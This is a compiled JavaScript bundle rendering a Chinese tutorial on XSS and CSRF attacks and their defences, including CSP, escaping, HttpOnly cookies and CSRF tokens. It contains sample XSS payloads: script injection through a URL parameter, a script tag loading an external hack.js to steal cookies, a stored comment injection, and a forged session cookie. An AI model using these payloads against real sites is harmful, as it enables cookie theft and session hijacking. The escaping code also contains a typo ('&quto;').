(window.webpackJsonp=window.webpackJsonp||[]).push([[72],{418:function(s,t,a){"use strict";a.r(t);var n=a(42),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"xss和csrf"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xss和csrf"}},[s._v("#")]),s._v(" XSS和CSRF")]),s._v(" "),a("h2",{attrs:{id:"一、xss"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#一、xss"}},[s._v("#")]),s._v(" 一、XSS")]),s._v(" "),a("p",[s._v("XSS (Cross-Site Scripting)，跨站脚本攻击，黑客将恶意脚本代码植入到页面中从而实现盗取用户信息等操作。")]),s._v(" "),a("h3",{attrs:{id:"xss攻击分类"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xss攻击分类"}},[s._v("#")]),s._v(" XSS攻击分类")]),s._v(" "),a("ul",[a("li",[s._v("反射型 - url参数直接注入")])]),s._v(" "),a("p",[s._v("用户A访问安全网站B，然后用户C发现B网站存在XSS漏洞，此时用户C向A发送了一封邮件，里面有包含恶意脚本的URL地址（此URL地址还是网站B的地址，只是路径上有恶意脚本），当用户点击访问时，因为网站B中cookie含有用户的敏感信息，此时用户C就可以利用脚本在受信任的情况下获取用户A的cookie信息，以及进行一些恶意操作。这种攻击叫做反射性XSS。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('// 普通\nhttp://localhost:3000/?from=china\n// alert尝试\nhttp://localhost:3000/?from=<script>alert(3)<\/script>\n// 获取Cookie\nhttp://localhost:3000/?from=<script src="http://localhost:4000/hack.js"><\/script>\n// 短域名伪造 https://dwz.cn/\n// 伪造cookie入侵 chrome\ndocument.cookie="kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUzNTY1MDAxO\nDYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br")])]),a("ul",[a("li",[s._v("存储型 - 存储到DB后读取时注入")])]),s._v(" "),a("p",[s._v("假设网站B是一个博客网站，恶意用户C在存在XSS漏洞的网站B发布了一篇文章，文章中存在一些恶意脚本，例如img标签、script标签等，这篇博客必然会存入数据库中，当其他用户访问该文章时恶意脚本就会执行，然后进行恶意操作。这种攻击方式叫做持久性XSS，将携带脚本的数据存入数据库，之后又由后台返回。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('// 评论\n<script>alert(1)<\/script>\n// 跨站脚本注入\n我来了<script src="http://localhost:4000/hack.js"><\/script>\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("h3",{attrs:{id:"xss攻击危害"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xss攻击危害"}},[s._v("#")]),s._v(" XSS攻击危害")]),s._v(" "),a("ul",[a("li",[s._v("获取页面数据")]),s._v(" "),a("li",[s._v("获取Cookies")]),s._v(" "),a("li",[s._v("劫持前端逻辑")]),s._v(" "),a("li",[s._v("发送请求")]),s._v(" "),a("li",[s._v("偷取网站的任意数据")]),s._v(" "),a("li",[s._v("偷取用户的资料")]),s._v(" "),a("li",[s._v("偷取用户的秘密和登录态")]),s._v(" "),a("li",[s._v("欺骗用户")])]),s._v(" "),a("h3",{attrs:{id:"防范手段"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#防范手段"}},[s._v("#")]),s._v(" 防范手段")]),s._v(" "),a("ul",[a("li",[s._v("服务端设置HEAD")])]),s._v(" "),a("div",{staticClass:"language-js line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[s._v("ctx"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("set")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'X-XSS-Protection'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 禁止XSS过滤")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// http://localhost:3000/?from=<script>alert(3)<\/script> 可以拦截 但伪装一下就不行了")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("0 禁止XSS过滤。\n1 启用XSS过滤（通常浏览器是默认的）。\n\n如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。\n1;mode=block 启用XSS过滤。 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。\n1;report= (Chromium only)  启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用CSP report-uri 指令的功能发送违规\n报告。\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("ul",[a("li",[s._v("CSP")])]),s._v(" "),a("p",[s._v("内容安全策略 (CSP, Content Security Policy) 是一个附加的安全层，用于帮助检测和缓解某些类型的攻\n击，包括跨站脚本 (XSS) 和数据注入等攻击。 这些攻击可用于实现从数据窃取到网站破坏或作为恶意软\n件分发版本等用途。\nCSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。")]),s._v(" "),a("div",{staticClass:"language-js line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 只允许加载本站资源")]),s._v("\nContent"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Security"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Policy"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("default")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("src "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'self'")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 只允许加载 HTTPS 协议图片")]),s._v("\nContent"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Security"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Policy"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" img"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("src https"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("/*\n// 不允许加载任何来源框架\nContent-Security-Policy: child-src 'none'\nctx.set('Content-Security-Policy', \"default-src 'self'\")\n// 尝试一下外部资源不能加载\nhttp://localhost:3000/?from=<script src=\"http://localhost:4000/hack.js\"><\/script>\n")])])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("ul",[a("li",[s._v("转义字符")])]),s._v(" "),a("p",[s._v("用户的输入永远不可信任的，最普遍的做法就是转义输入输出的内容，对于引号、尖括号、斜杠进行转义")]),s._v(" "),a("div",{staticClass:"language-js line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 黑名单转义")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("escape")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token parameter"}},[s._v("str")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    str "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[s._v("/&/g")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'&amp;'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    str "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[s._v("/</g")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'&lt;'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    str "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[s._v("/>/g")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'&gt;'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    str "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[s._v('/"/g')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'&quto;'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    str "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[s._v("/'/g")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'&#39;'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    str "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[s._v("/`/g")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'&#96;'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    str "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[s._v("/\\//g")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'&#x2F;'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" str\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br")])]),a("p",[s._v("富文本来说，显然不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式。")]),s._v(" "),a("div",{staticClass:"language-js line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 白名单转义")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("const")]),s._v(" xss "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("require")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'xss'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("let")]),s._v(" html "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("xss")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('\'<h1 id="title">XSS Demo</h1><script>alert("xss");<\/script>\'')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v('// -> <h1>XSS Demo</h1>&lt;script&gt;alert("xss");&lt;/script&gt;')]),s._v("\nconsole"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("log")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("html"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("ul",[a("li",[s._v("HttpOnly Cookie")])]),s._v(" "),a("p",[s._v("这是预防XSS攻击窃取用户cookie最有效的防御手段。Web应用程序在设置cookie时，将其属性设为HttpOnly，就可以避免该网页的cookie被客户端恶意JavaScript窃取，保护用户cookie信息。")]),s._v(" "),a("div",{staticClass:"language-js line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[s._v("response"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("addHeader")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Set-Cookie"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"uid=112; Path=/; HttpOnly"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"二、csrf"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#二、csrf"}},[s._v("#")]),s._v(" 二、CSRF")]),s._v(" "),a("p",[s._v("CSRF(Cross Site Request Forgery)，即跨站请求伪造，是一种常见的Web攻击，它利用用户已登录的身份，\n在用户毫不知情的情况下，以用户的名义完成非法操作。")]),s._v(" "),a("ul",[a("li",[s._v("用户已经登录了站点 A，并在本地记录了 cookie")]),s._v(" "),a("li",[s._v("在用户没有登出站点 A 的情况下（也就是 cookie生效的情况下），访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点A)。")]),s._v(" "),a("li",[s._v("站点 A 没有做任何 CSRF 防御")])]),s._v(" "),a("h3",{attrs:{id:"csrf攻击危害"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#csrf攻击危害"}},[s._v("#")]),s._v(" CSRF攻击危害")]),s._v(" "),a("ul",[a("li",[s._v("利用用户登录态")]),s._v(" "),a("li",[s._v("用户不知情")]),s._v(" "),a("li",[s._v("完成业务请求")]),s._v(" "),a("li",[s._v("盗取用户资金（转账，消费）")]),s._v(" "),a("li",[s._v("冒充用户发帖背锅")]),s._v(" "),a("li",[s._v("损害网站声誉")])]),s._v(" "),a("h3",{attrs:{id:"防范手段-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#防范手段-2"}},[s._v("#")]),s._v(" 防范手段")]),s._v(" "),a("ul",[a("li",[s._v("Referer验证（判断页面的来源referer是否来自本站）")]),s._v(" "),a("li",[s._v("验证码(最有效)")]),s._v(" "),a("li",[s._v("Token 令牌验证（因为token是加在头部的，而csrf在伪造请求的时候只会带上cookie，不会带上token，所以就可以避免攻击）")]),s._v(" "),a("li",[s._v("禁止第三方网站带Cookie - 有兼容性问题")])]),s._v(" "),a("h2",{attrs:{id:"三、两者区别"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#三、两者区别"}},[s._v("#")]),s._v(" 三、两者区别")]),s._v(" "),a("ul",[a("li",[s._v("CSRF需要登陆后操作，XSS不需要。")]),s._v(" "),a("li",[s._v("CSRF是请求页面api来实现非法操作，XSS是向当前页面植入js脚本来修改页面内容。")])])])}),[],!1,null,null,null);t.default=e.exports}}]);